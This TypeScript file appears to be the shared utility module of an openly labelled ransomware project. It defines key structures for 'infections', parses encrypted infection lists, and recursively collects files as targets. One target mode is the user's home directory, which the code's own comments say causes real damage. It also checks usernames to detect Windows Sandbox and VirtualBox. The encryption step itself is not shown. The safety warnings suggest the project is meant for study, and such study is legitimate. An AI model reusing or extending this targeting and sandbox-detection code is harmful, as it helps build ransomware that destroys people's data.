import fs, { PathLike } from "node:fs";
import path from "node:path";
import { machineIdSync } from "node-machine-id";
import os from "node:os";

export const DEVELOPMENT = true;
export const TMP_PATH = path.join(process.cwd(), ".tmp");

let RANSOMWARE_FILE_PREFIX: string;

// Used to identify files created by our ransomware vs victim's files
export function setRansomwareHash(hash: Buffer) {
  RANSOMWARE_FILE_PREFIX = hash.toString("hex");
}

// Used to identify files created by our ransomware vs victim's files
export function getRansomwareHash(): string {
  return RANSOMWARE_FILE_PREFIX;
}

export type MachineDecryptionKeys = {
  machineSpecificPublicKey: string;
  machineSpecificPrivateKey: string;
  rootPublicKeyHashBase64: string;
};

export function appendLog(log: any, trace: boolean = false) {
  const logsFilePath = path.join(
    process.cwd(),
    `logs.${RANSOMWARE_FILE_PREFIX}.txt`
  );

  const firstLog = !fs.existsSync(logsFilePath);

  if (firstLog) {
    fs.writeFileSync(logsFilePath, "", { encoding: "utf8" });
  }

  fs.appendFileSync(
    logsFilePath,
    (firstLog ? "" : "\n") +
      JSON.stringify(
        {
          log,
        },
        null,
        2
      ) +
      (trace === true ? "\nStack Trace: " + new Error().stack + "EOE\n\n" : ""),
    {
      encoding: "utf8",
    }
  );
}

export type EncryptedInfection = string;

export type Infection = {
  // All base64 encoded
  rootPublicKey: string;
  machineSpecificPublicKey: string;
  encrytedMachineSpecificPrivateKey: string;
};

export function isValidBase64(source: string): boolean {
  return /^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$/g.test(
    source
  );
}

export function isNotEmpty(source: string): boolean {
  return source.length > 0;
}

export function parseEncryptedInfectionsFile(filePath: fs.PathLike): string[] {
  return parseEncryptedInfections(
    fs.readFileSync(filePath, { encoding: "utf8" })
  );
}

export function parseEncryptedInfections(content: string): string[] {
  const infections = content
    .split("\n")
    .filter(isValidBase64)
    .filter(isNotEmpty);

  return infections;
}

async function* streamDirectoryFilesRecursively(
  dirPath: string
): AsyncGenerator<[PathLike, boolean]> {
  console.log("Streaming " + dirPath);

  try {
    for (const osEntryPath of fs.readdirSync(dirPath)) {
      const fullOsEntryPath = path.join(dirPath, osEntryPath);

      const stats = fs.statSync(fullOsEntryPath);

      if (stats.isDirectory()) {
        yield* streamDirectoryFilesRecursively(fullOsEntryPath);
      } else if (stats.isSymbolicLink()) {
        // TODO: Handle symbolic links.
      } else if (stats.isFile()) {
        if (osEntryPath.includes(RANSOMWARE_FILE_PREFIX)) {
          yield [fullOsEntryPath, true];
        } else {
          console.log("Yielding " + fullOsEntryPath);
          yield [fullOsEntryPath, false];
        }
      } else {
        /** Ignore, we don't know how to handle this */
      }
    }
  } catch (e: any) {
    if (e.code === "EPERM") {
      // No permission
      appendLog(e, true);
    }
  }
}

// All checks are not accurate enough to protect someone's machine.
// But they are enough to allow you to debug this ransomware with a default/detectable VM.
export async function isVm(): Promise<boolean> {
  const userInfo = os.userInfo();

  async function detectWindowsSandbox(): Promise<boolean> {
    return userInfo.username === "WDAGUtilityAccount";
  }

  async function detectOracleVmVirtualBox(): Promise<boolean> {
    // will produce wrong outputs if your real machine is called "vboxuser" or if you change your default VM username.
    return userInfo.username === "vboxuser";
  }

  const checks: (() => Promise<boolean>)[] = [
    detectWindowsSandbox,
    detectOracleVmVirtualBox,
    // Add other checks
  ];

  return await (async () => {
    for (const check of checks) {
      if (await check()) {
        return true;
      }
    }

    return false;
  })();
}

function waitKeyPressed(): Promise<void> {
  return new Promise((resolve) => {
    const wasRaw = process.stdin.isRaw;
    process.stdin.setRawMode(true);
    process.stdin.resume();
    process.stdin.once("data", (data) => {
      process.stdin.pause();
      process.stdin.setRawMode(wasRaw);
      resolve();
    });
  });
}

export async function getMachineId(): Promise<string> {
  return machineIdSync();
}

async function* streamSystemDir(): AsyncGenerator<[PathLike, boolean]> {
  yield* streamDirectoryFilesRecursively(os.homedir());
}

// Will point create a tmp folder inside the working directory with the
async function* streamTmpDirInsideWorkingDir(): AsyncGenerator<
  [PathLike, boolean]
> {
  try {
    const stats = fs.statSync(TMP_PATH);

    if (stats.isDirectory()) {
      yield* streamDirectoryFilesRecursively(TMP_PATH);
    } else {
      fs.rmSync(TMP_PATH, { recursive: true });
      yield* streamTmpDirInsideWorkingDir();
    }
  } catch (e: any) {
    if (e.code === "ENOENT") {
      yield* streamFreshTmpDirInsideWorkingDir();
    }
  }
}

async function* streamFreshTmpDirInsideWorkingDir(): AsyncGenerator<
  [PathLike, boolean]
> {
  if (fs.existsSync(TMP_PATH)) {
    fs.rmSync(TMP_PATH, { recursive: true });
  }

  // Create a fresh dir.
  fs.mkdirSync(TMP_PATH);

  for (let i = 0; i < 10; i++) {
    const filePath = path.join(TMP_PATH, `sample_${i}.txt`);
    fs.writeFileSync(filePath, `Plain: `.padEnd(100, `${i}`));
  }

  yield* streamDirectoryFilesRecursively(TMP_PATH);
}

export enum RansomDirMode {
  /**
   * Will delete a tmp folder if exists and create new files with random content and serve as the target of ransomware.
   */
  streamFreshTmpDir = "streamFreshTmpDir",

  /**
   * Will serve the tmp folder if it exists, otherwise will create new files with random content and serve as the target of ransomware.
   */
  streamTmpDir = "streamTmpDir",

  /**
   * Caution, using this will put the host machine system folders (Downloads, Desktop, etc.) as target of the ransomware.
   *
   * It will cause real damage in at someone's computer if they lose the private key.
   *
   * Never use this mode in a machine that you do not own or do not have permission to do so.
   *
   * Run this mode only when the host machine is a sandbox or a virtual machine, never real machines.
   */
  streamSystemDir = "streamSystemDir",
}

export const RANSOM_DIR_MODES = Object.values(RansomDirMode);

export const SAFE_RANSOM_DIR_MODE = RansomDirMode.streamFreshTmpDir;

export function streamTargetFiles(
  mode: RansomDirMode
): AsyncGenerator<[PathLike, boolean]> {
  switch (mode) {
    case RansomDirMode.streamFreshTmpDir:
      return streamFreshTmpDirInsideWorkingDir();
    case RansomDirMode.streamTmpDir:
      return streamTmpDirInsideWorkingDir();
    case RansomDirMode.streamSystemDir:
      return streamSystemDir();
    default:
      return (async function* () {})();
  }
}
